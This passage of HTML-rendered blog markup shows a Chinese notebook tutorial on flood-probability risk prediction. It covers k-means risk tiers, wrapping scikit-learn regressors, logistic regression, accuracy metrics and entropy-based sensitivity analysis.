class=\"number\">0</span>]&#125;</span>&#x27;</span>]=<span class=\"string\">&#x27;低风险&#x27;</span></span><br><span class=\"line\">dic[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;indices[<span class=\"number\">1</span>]&#125;</span>&#x27;</span>]=<span class=\"string\">&#x27;中风险&#x27;</span></span><br><span class=\"line\">dic[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;indices[<span class=\"number\">2</span>]&#125;</span>&#x27;</span>]=<span class=\"string\">&#x27;高风险&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"示例\"><a class=\"anchor\" href=\"#示例\">#</a> 示例</h4>\n<p>data= [0.55,0.99,0.51,0.42]</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data= [<span class=\"number\">0.55</span>,<span class=\"number\">0.99</span>,<span class=\"number\">0.51</span>,<span class=\"number\">0.42</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(predict_cluster(kmeans,data))</span><br></pre></td></tr></table></figure></p>\n<pre><code>[1 1 2 0]\n</code></pre>\n<h3 id=\"基于风险预警的预测模型\"><a class=\"anchor\" href=\"#基于风险预警的预测模型\">#</a> 基于风险预警的预测模型</h3>\n<h4 id=\"模型建立-mymodel\"><a class=\"anchor\" href=\"#模型建立-mymodel\">#</a> 模型建立 MyModel</h4>\n<pre><code>内核    ：某一个概率预测模型与kmeans聚类模型\npredict : 预测输入的X对应的y的风险类别\nscore   : 利用预测成功的比例衡量得分\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MyModel</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self,model,kmeans</span>) -&gt; <span class=\"literal\">None</span>:</span><br><span class=\"line\">        self.model = model</span><br><span class=\"line\">        self.kmeans = kmeans</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">predict</span>(<span class=\"params\">self,X_test</span>) -&gt; np.ndarray:</span><br><span class=\"line\">        y_pred=self.model.predict(X_test)</span><br><span class=\"line\">        y_pred=np.array(y_pred)</span><br><span class=\"line\">        y_pred=predict_cluster(kmeans,y_pred)</span><br><span class=\"line\">        y_pred=np.array(y_pred)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> y_pred</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">score</span>(<span class=\"params\">self,X_test,y_test</span>):</span><br><span class=\"line\">        y_pred=self.predict(X_test)</span><br><span class=\"line\">        y_test = np.array(y_test)</span><br><span class=\"line\">        y_true=predict_cluster(kmeans,y_test)</span><br><span class=\"line\">        correct_predictions = np.<span class=\"built_in\">sum</span>(y_pred == y_true)</span><br><span class=\"line\">        overlap = correct_predictions / y_pred.size</span><br><span class=\"line\">        <span class=\"keyword\">return</span> overlap</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"数据读入-2\"><a class=\"anchor\" href=\"#数据读入-2\">#</a> 数据读入</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">map_dic</span>(<span class=\"params\">dic,a</span>):</span><br><span class=\"line\">    a=np.array(a)</span><br><span class=\"line\">    lis=[]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">        lis.append(dic[<span class=\"string\">f&#x27;[<span class=\"subst\">&#123;i&#125;</span>]&#x27;</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> np.array(lis)</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\">train_data_copy=train_data</span><br><span class=\"line\">train_data_copy[<span class=\"string\">&#x27;洪水概率&#x27;</span>] = predict_cluster(kmeans,np.array(train_data_copy[<span class=\"string\">&#x27;洪水概率&#x27;</span>]))</span><br><span class=\"line\">train_data_copy[<span class=\"string\">&#x27;洪水概率&#x27;</span>] = map_dic(dic,train_data_copy[<span class=\"string\">&#x27;洪水概率&#x27;</span>])</span><br><span class=\"line\">train_data_copy.to_csv(<span class=\"string\">&#x27;../Data/train_dealed.csv&#x27;</span>,index=<span class=\"literal\">False</span>,encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\">train_data=train_data.drop(columns=<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">X=train_data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">y=train_data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\">y=np.array(y)</span><br><span class=\"line\">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class=\"number\">0.2</span>, random_state=<span class=\"number\">42</span>)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"利用先前模型构建自定义的分类模型\"><a class=\"anchor\" href=\"#利用先前模型构建自定义的分类模型\">#</a> 利用先前模型构建自定义的分类模型</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">models = [<span class=\"string\">&#x27;linear.pkl&#x27;</span>,<span class=\"string\">&#x27;gb_tree.pkl&#x27;</span>,<span class=\"string\">&#x27;ju_tree.pkl&#x27;</span>,<span class=\"string\">&#x27;rf_forest.pkl&#x27;</span>]</span><br><span class=\"line\">path = <span class=\"string\">&#x27;../Model&#x27;</span></span><br><span class=\"line\">m_path=<span class=\"string\">&#x27;../Model/3_means&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> model <span class=\"keyword\">in</span> models:</span><br><span class=\"line\">    model_name=model.replace(<span class=\"string\">&#x27;.pkl&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;当前模型为<span class=\"subst\">&#123;model&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    model_path=os.path.join(path,model)</span><br><span class=\"line\">    model = joblib.load(model_path)</span><br><span class=\"line\">    model = MyModel(model,kmeans)</span><br><span class=\"line\">    <span class=\"comment\"># 这里可以加入模型的预测过程</span></span><br><span class=\"line\">    y_pred = model.predict(X_test)</span><br><span class=\"line\">    y_true=predict_cluster(kmeans,y_test)</span><br><span class=\"line\">    mse = mean_squared_error(y_true, y_pred)</span><br><span class=\"line\">    score = model.score(X_test,y_test)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model score: <span class=\"subst\">&#123;score&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;均方误差为: <span class=\"subst\">&#123;mse&#125;</span>&quot;</span>)</span><br><span class=\"line\">    accuracy = cosine(y_true,y_pred)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;accuracy&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> model_name == <span class=\"string\">&#x27;linear&#x27;</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;不同指标的权重为&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(model.model.coef_)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;不同指标的权重为&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(model.model.feature_importances_)</span><br><span class=\"line\">    joblib.dump(model,m_path+<span class=\"string\">&#x27;/&#x27;</span>+model_name+<span class=\"string\">&#x27;.pkl&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<pre><code>当前模型为linear.pkl\nModel score: 0.7765729680757218\n均方误差为: 0.6680161171113177\n余弦相似度为0.8397624947557178\n不同指标的权重为\n[0.00560656 0.00564613 0.00565985 0.00567684 0.00565284 0.0056578\n 0.00565561 0.00564293 0.0056437  0.0056492  0.00564238 0.0056413\n 0.005674   0.00564575 0.0056467  0.00562068 0.00568107 0.00563092\n 0.00561738 0.00564302]\n当前模型为gb_tree.pkl\nModel score: 0.7688148201130105\n均方误差为: 0.6767756240612259\n余弦相似度为0.8430676769184631\n不同指标的权重为\n[0.05053843 0.0513698  0.05097438 0.04985333 0.04968169 0.0498542\n 0.05148326 0.05025949 0.04944183 0.04878379 0.04970291 0.04908077\n 0.0490136  0.05042491 0.04939282 0.05113171 0.05085744 0.04953673\n 0.04897519 0.04964374]\n当前模型为ju_tree.pkl\nModel score: 0.5086617552392533\n均方误差为: 1.1945068306988056\n余弦相似度为0.7075274653380997\n不同指标的权重为\n[0.05072873 0.04679774 0.04822921 0.0498514  0.05054892 0.05003494\n 0.04871661 0.0509244  0.05185402 0.04976417 0.04994974 0.0515037\n 0.05054295 0.05088047 0.04947362 0.04914221 0.04920693 0.0502652\n 0.05116479 0.05042025]\n当前模型为rf_forest.pkl\nModel score: 0.5983406051069309\n均方误差为: 1.0319147414348044\n余弦相似度为0.7889832533919223\n不同指标的权重为\n[0.04968638 0.04813227 0.04933601 0.05021542 0.05116166 0.0494662\n 0.05073097 0.05094782 0.05060163 0.05058865 0.04939483 0.05095208\n 0.05029554 0.05063372 0.04975227 0.04803734 0.04872015 0.05049445\n 0.05024486 0.05060773]\n</code></pre>\n<h4 id=\"逻辑回归\"><a class=\"anchor\" href=\"#逻辑回归\">#</a> 逻辑回归</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\">train_data=train_data.drop(columns=<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\">X=train_data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">y=train_data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\">y=np.array(y)</span><br><span class=\"line\">y=predict_cluster(kmeans,y)</span><br><span class=\"line\">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class=\"number\">0.2</span>, random_state=<span class=\"number\">42</span>)</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">model = LogisticRegression(solver=<span class=\"string\">&#x27;liblinear&#x27;</span>)</span><br><span class=\"line\">model.fit(X_train,y_train)</span><br><span class=\"line\">y_pred = model.predict(X_test)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">y_true=y_test</span><br><span class=\"line\">mse = mean_squared_error(y_true, y_pred)</span><br><span class=\"line\">score =np.<span class=\"built_in\">sum</span>(y_true==y_pred)/<span class=\"built_in\">len</span>(y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model score: <span class=\"subst\">&#123;score&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;均方误差为: <span class=\"subst\">&#123;mse&#125;</span>&quot;</span>)</span><br><span class=\"line\">accuracy = cosine(y_true,y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;accuracy&#125;</span>&#x27;</span>)</span><br><span class=\"line\">joblib.dump(model,<span class=\"string\">&#x27;../Model/3_means/logistic.pkl&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model score: 0.7634599337195718\n均方误差为: 0.5021147748134372\n余弦相似度为0.8741869419358508\n\n\n\n\n\n['../Model/3_means/logistic.pkl']\n</code></pre>\n<h3 id=\"模型灵敏度分析\"><a class=\"anchor\" href=\"#模型灵敏度分析\">#</a> 模型灵敏度分析</h3>\n<pre><code>利用结果的熵值来衡量模型的灵敏度\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\">train_data = train_data.drop(columns=<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\">X=train_data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"设置熵的计算函数-calculate_entropy\"><a class=\"anchor\" href=\"#设置熵的计算函数-calculate_entropy\">#</a> 设置熵的计算函数 calculate_entropy</h4>\n<pre><code>input: list\nouput :总熵\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">calculate_entropy</span>(<span class=\"params\">lst</span>):</span><br><span class=\"line\">    value_counts = np.unique(lst, return_counts=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    values, counts = value_counts</span><br><span class=\"line\">    total_count = <span class=\"built_in\">len</span>(lst)</span><br><span class=\"line\">    probabilities = counts / total_count</span><br><span class=\"line\">    entropy = -np.<span class=\"built_in\">sum</span>(probabilities * np.log2(probabilities))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> entropy</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"设置基于属性变化率的计算函数-average_change_rate\"><a class=\"anchor\" href=\"#设置基于属性变化率的计算函数-average_change_rate\">#</a> 设置基于属性变化率的计算函数 average_change_rate</h4>\n<pre><code>input:list\noutput: 平均相邻变化率\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">average_change_rate</span>(<span class=\"params\">lst</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 检查列表是否至少有两项</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(lst) &lt; <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    change_rates = [(lst[i+<span class=\"number\">1</span>] - lst[i]) / lst[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(lst) - <span class=\"number\">1</span>)]</span><br><span class=\"line\">    avg_change_rate = <span class=\"built_in\">sum</span>(change_rates) / <span class=\"built_in\">len</span>(change_rates)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> avg_change_rate</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"启动基于属性对概率变化率的灵敏度计算\"><a class=\"anchor\" href=\"#启动基于属性对概率变化率的灵敏度计算\">#</a> 启动基于属性对概率变化率的灵敏度计算</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">models = [<span class=\"string\">&#x27;linear.pkl&#x27;</span>,<span class=\"string\">&#x27;gb_tree.pkl&#x27;</span>,<span class=\"string\">&#x27;ju_tree.pkl&#x27;</span>,<span class=\"string\">&#x27;rf_forest.pkl&#x27;</span>]</span><br><span class=\"line\">path=<span class=\"string\">&#x27;../Model&#x27;</span></span><br><span class=\"line\">m_path=<span class=\"string\">&#x27;../Model/3_means&#x27;</span></span><br><span class=\"line\">entropy_list=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> model <span class=\"keyword\">in</span> models:</span><br><span class=\"line\">    model_copy=model</span><br><span class=\"line\">    train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">    train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\">    train_data = train_data.drop(columns=<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\">    X=train_data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">    model_name=model.replace(<span class=\"string\">&#x27;.pkl&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;当前模型为<span class=\"subst\">&#123;model&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 读入模型</span></span><br><span class=\"line\">    model_path=os.path.join(path,model)</span><br><span class=\"line\">    model = joblib.load(model_path)</span><br><span class=\"line\">    av_list=[]</span><br><span class=\"line\">    <span class=\"comment\"># 计算不同模型的变化率</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> each_column <span class=\"keyword\">in</span> X.columns: </span><br><span class=\"line\">        temp_X=pd.DataFrame(columns=X.columns)</span><br><span class=\"line\">        target=np.array(X[each_column])</span><br><span class=\"line\">        <span class=\"built_in\">min</span>=np.<span class=\"built_in\">min</span>(target)</span><br><span class=\"line\">        <span class=\"built_in\">max</span>=np.<span class=\"built_in\">max</span>(target)</span><br><span class=\"line\">        column_list=[]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">min</span>,<span class=\"built_in\">max</span>+<span class=\"number\">1</span>):</span><br><span class=\"line\">            temp_X_copy=X</span><br><span class=\"line\">            temp_X_copy[each_column]=i</span><br><span class=\"line\">            y_pred=model.predict(temp_X_copy)</span><br><span class=\"line\">            column_list.append(y_pred.mean())</span><br><span class=\"line\">        av_list.append(average_change_rate(column_list))</span><br><span class=\"line\">    df = pd.DataFrame(&#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;属性&#x27;</span>: X.columns,</span><br><span class=\"line\">    <span class=\"string\">&#x27;变化率&#x27;</span>: av_list</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    df.plot(kind=<span class=\"string\">&#x27;bar&#x27;</span>, x=<span class=\"string\">&#x27;属性&#x27;</span>, y=<span class=\"string\">&#x27;变化率&#x27;</span>)</span><br><span class=\"line\">    plt.title(<span class=\"string\">f&#x27;<span class=\"subst\">&#123;model_name&#125;</span>属性平均变化率&#x27;</span>)</span><br><span class=\"line\">    plt.xlabel(<span class=\"string\">&#x27;属性&#x27;</span>)</span><br><span class=\"line\">    plt.ylabel(<span class=\"string\">&#x27;变化率&#x27;</span>)</span><br><span class=\"line\">    plt.show()</span><br></pre></td></tr></table></figure></p>\n<pre><code>当前模型为linear.pkl\n</code></pre>\n<p><img data-src=\"output_75_1.png\" alt=\"png\" /></p>\n<pre><code>当前模型为gb_tree.pkl\n</code></pre>\n<p><img data-src=\"output_75_3.png\" alt=\"png\" /></p>\n<pre><code>当前模型为ju_tree.pkl\n</code></pre>\n<p><img data-src=\"output_75_5.png\" alt=\"png\" /></p>\n<pre><code>当前模型为rf_forest.pkl\n</code></pre>\n<p><img data-src=\"output_75_7.png\" alt=\"png\" /></p>\n<h4 id=\"启动基于预测结果的熵值的灵敏度计算\"><a class=\"anchor\" href=\"#启动基于预测结果的熵值的灵敏度计算\">#</a> 启动基于预测结果的熵值的灵敏度计算</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">models = [<span class=\"string\">&#x27;linear.pkl&#x27;</span>,<span class=\"string\">&#x27;gb_tree.pklfvv&#x27;</span>,<span class=\"string\">&#x27;ju_tree.pkl&#x27;</span>,<span class=\"string\">&#x27;rf_forest.pkl&#x27;</span>,<span class=\"string\">&#x27;logistic.pkl&#x27;</span>]</span><br><span class=\"line\">path=<span class=\"string\">&#x27;../Model&#x27;</span></span><br><span class=\"line\">m_path=<span class=\"string\">&#x27;../Model/3_means&#x27;</span></span><br><span class=\"line\">entropy_list=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> model <span class=\"keyword\">in</span> models:</span><br><span class=\"line\">    model_copy=model</span><br><span class=\"line\">    train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">    train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\">    train_data = train_data.drop(columns=<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\">    X=train_data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">    model_name=model.replace(<span class=\"string\">&#x27;.pkl&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;当前模型为<span class=\"subst\">&#123;model&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    model_path=os.path.join(m_path,model_copy)</span><br><span class=\"line\">    model = joblib.load(model_path)</span><br><span class=\"line\">    train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">    train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\">    train_data = train_data.drop(columns=<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\">    X=train_data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">    train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\">    temp_X=X</span><br><span class=\"line\">    y_pred=model.predict(X)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(y_pred)</span><br><span class=\"line\">    temp_X[<span class=\"string\">&#x27;洪水概率&#x27;</span>]=y_pred</span><br><span class=\"line\">    temp_X[<span class=\"string\">&#x27;id&#x27;</span>]=train_data[<span class=\"string\">&#x27;id&#x27;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):    </span><br><span class=\"line\">        temp=temp_X[temp_X[<span class=\"string\">&#x27;洪水概率&#x27;</span>]==i]</span><br><span class=\"line\">        temp[<span class=\"string\">&#x27;洪水概率&#x27;</span>]=dic[<span class=\"string\">f&#x27;[<span class=\"subst\">&#123;i&#125;</span>]&#x27;</span>]</span><br><span class=\"line\">        name=dic[<span class=\"string\">f&#x27;[<span class=\"subst\">&#123;i&#125;</span>]&#x27;</span>]</span><br><span class=\"line\">        csv_path=<span class=\"string\">&#x27;../Data/3_means/&#x27;</span></span><br><span class=\"line\">        temp.to_csv(csv_path+<span class=\"string\">f&#x27;<span class=\"subst\">&#123;model_name&#125;</span>&#x27;</span>+<span class=\"string\">&#x27;/&#x27;</span>+<span class=\"string\">f&#x27;<span class=\"subst\">&#123;name&#125;</span>.csv&#x27;</span>,index=<span class=\"literal\">False</span>,encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    entropy_list.append(calculate_entropy(y_pred))</span><br><span class=\"line\">df = pd.DataFrame(&#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;模型&#x27;</span>: [<span class=\"string\">&#x27;线性回归&#x27;</span>,<span class=\"string\">&#x27;梯度提升树&#x27;</span>,<span class=\"string\">&#x27;决策树&#x27;</span>,<span class=\"string\">&#x27;随机森林&#x27;</span>,<span class=\"string\">&#x27;逻辑回归&#x27;</span>],</span><br><span class=\"line\">    <span class=\"string\">&#x27;熵值&#x27;</span>: entropy_list</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">df.plot(kind=<span class=\"string\">&#x27;bar&#x27;</span>, x=<span class=\"string\">&#x27;模型&#x27;</span>, y=<span class=\"string\">&#x27;熵值&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">f&#x27;不同模型的灵敏度&#x27;</span>)</span><br><span class=\"line\">plt.xlabel(<span 